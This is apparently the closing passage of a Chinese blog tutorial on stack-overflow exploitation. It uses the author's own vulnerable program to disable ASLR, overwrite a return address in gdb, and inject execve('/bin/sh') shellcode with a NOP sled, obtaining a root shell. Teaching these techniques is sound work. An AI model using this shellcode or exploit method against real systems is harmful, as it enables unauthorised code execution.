+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>为了降低漏洞利用的难度，我们先关闭系统的ASLR机制（地址随机化）。命令<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>，将文件的值设置为0（这是临时设置，重启后无效，永久设置，需在/etc/sysctl.conf，添加kernel.randomize_va_space = value）。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@scbox-1596421650158 Documents]# gdb -q --args a.out $(python -c &#x27;print &quot;A&quot; * 140 + &quot;BBBB&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">Reading symbols from /home/scbox/Documents/a.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/scbox/Documents/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br><span class="line">argv[1]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 in ?? ()</span><br><span class="line">Missing separate debuginfos, use: debuginfo-install glibc-2.17-307.el7.1.i686</span><br><span class="line">(gdb) x/10x $esp -160  #缓冲区开头地址为0xffffcff0</span><br><span class="line">0xffffcfe0:	0x0804857f	0xffffcff0	0x00000001	0xf7ffd900</span><br><span class="line">0xffffcff0:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0xffffd000:	0x41414141	0x41414141</span><br><span class="line">(gdb) x/10x $esp -20</span><br><span class="line">0xffffd06c:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0xffffd07c:	0x42424242	0x00000000	0xffffd114	0xffffd120</span><br><span class="line">0xffffd08c:	0xf7fd86b0	0x00000001</span><br></pre></td></tr></table></figure>
+
+<p>在shell中$()表示执行输入的命令，这里我们将a.out的输入参数变为140个A+4个B。可以看到程序发生了segmentation fault错误，就是因为返回地址变为了0x42424242。打印esp也可以看到我们的填充是成功了的。</p>
+<p>那么接下来我们使用sehllcode来填充buffer，剩余的用A字符，最后的返回地址填buffer的起始地址，这样程序跳转到返回地址执行的时候，就会执行我们的shellcode。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb -q --args a.out $(python -c <span class="string">&#x27;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; + &quot;A&quot; * (140 - 24) + &quot;\xf0\xcf\xff\xff&quot;&#x27;</span>)</span></span><br><span class="line">Reading symbols from /home/scbox/Documents/a.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/scbox/Documents/a.out 1�Ph//shh/bin��PS�ᙰ</span><br><span class="line">                                                                 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����</span><br><span class="line">argv[1]: 1�Ph//shh/bin��PS�ᙰ</span><br><span class="line">                            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����</span><br><span class="line">process 16289 is executing new program: /usr/bin/bash</span><br><span class="line">Missing separate debuginfos, use: debuginfo-install glibc-2.17-307.el7.1.i686</span><br><span class="line">sh-4.2#   #进入shell了！</span><br></pre></td></tr></table></figure>
+
+<p>以上是在gdb中使用shellcode，但是直接运行shellcode，其实并不能执行，因为gdb会为程序增加一些存储在栈上的环境变量（便于调试），这样的话，栈用得更多，栈地址就会变低。直接运行的时候栈地址比gdb中的高，所以不能执行。</p>
+<p>那么我们的解决办法是，把0xffffcff0栈地址增加到0xffffd02c（增加60个字节），然后增加的这部分填充为NOP指令，这样返回地址为60个字节地址中的任意一个，都可以执行到我们的shellcode。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./a.out $(python -c <span class="string">&#x27;print &quot;\x90&quot; * 60 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot; + &quot;A&quot; * (140 - 60 - 24)+ &quot;\x2c\xd0\xff\xff&quot;&#x27;</span>)</span></span><br><span class="line">argv[1]: ������������������������������������������������������������1�Ph//shh/bin��PS�ᙰ</span><br><span class="line">        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,���</span><br><span class="line">sh-4.2# </span><br></pre></td></tr></table></figure>
+
+<p>成功啦！</p>
+
+    </div>
+
+    
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:16px;">----------------------END <i class="far fa-smile-wink"></i> END----------------------</div>
+    
+</div>
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>harpersu00
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://harpersu00.github.io/adec3bdf.html" title="栈溢出之 shellcode">https://harpersu00.github.io/adec3bdf.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/1e59798b.html" rel="prev" title="GOT 表劫持原理">
+      <i class="fa fa-chevron-left"></i> GOT 表劫持原理
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  
+  <div class="comments">
+  <script src="https://utteranc.es/client.js" repo="harpersu00/ForBlogComments" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>
+  </div>
+  
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88stack-overflow%EF%BC%89%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">栈溢出（stack overflow）原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%B6%E4%BD%9Cshellcode"><span class="nav-number">3.</span> <span class="nav-text">制作shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode%E7%AE%80%E4%BB%8B"><span class="nav-number">3.1.</span> <span class="nav-text">shellcode简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99shellcode"><span class="nav-number">3.2.</span> <span class="nav-text">编写shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95shellcode"><span class="nav-number">3.3.</span> <span class="nav-text">测试shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E5%8F%96shellcode"><span class="nav-number">3.4.</span> <span class="nav-text">提取shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">栈溢出简单利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E7%BC%93%E5%86%B2%E5%8C%BA%E9%95%BF%E5%BA%A6"><span class="nav-number">4.1.</span> <span class="nav-text">计算缓冲区长度</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="harpersu00"
+      src="/images/avatar1.JPG">
+  <p class="site-author-name" itemprop="name">harpersu00</p>
+  <div class="site-description" itemprop="description">记录，记录一下ing</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/harpersu00" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;harpersu00" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:harpersu00@gmail.com" title="E-Mail → mailto:harpersu00@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+      
+      <!-- 添加近期文章 -->
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-block">
+        <div class="links-of-blogroll-title">
+          <!-- modify icon to fire by szw -->
+          <i class="fa fa-history fa-" aria-hidden="true"></i>
+          近期文章
+        </div>
+        <ul class="links-of-blogroll-list">
+          
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2019-01-08T00:00:00+08:00">
+                  &emsp;01-08
+                </time>
+                <a href="/adec3bdf.html" title="栈溢出之 shellcode">栈溢出之 shellcode</a>
+                <br>
+            </li>
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2018-09-19T00:00:00+08:00">
+                  &emsp;09-19
+                </time>
+                <a href="/1e59798b.html" title="GOT 表劫持原理">GOT 表劫持原理</a>
+                <br>
+            </li>
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2017-05-09T00:00:00+08:00">
+                  &emsp;05-09
+                </time>
+                <a href="/50ed72f.html" title="（译）Handling low memory conditions in iOS and Mavericks">（译）Handling low memory conditions in iOS and Mavericks</a>
+                <br>
+            </li>
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2017-04-12T00:00:00+08:00">
+                  &emsp;04-12
+                </time>
+                <a href="/ebd19f03.html" title="Objective-C 中的类结构">Objective-C 中的类结构</a>
+                <br>
+            </li>
+          
+            <li class='pull-left' style="white-space:wrap" align="left" >
+                <time title="创建时间" itemprop="dateCreated datePublished" datetime="2017-03-23T00:00:00+08:00">
+                  &emsp;03-23
+                </time>
+                <a href="/9acae560.html" title="Hook 原理之 CydiaSubstrate（二）：MSHookMessageEx">Hook 原理之 CydiaSubstrate（二）：MSHookMessageEx</a>
+                <br>
+            </li>
+          
+        </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">harpersu00</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
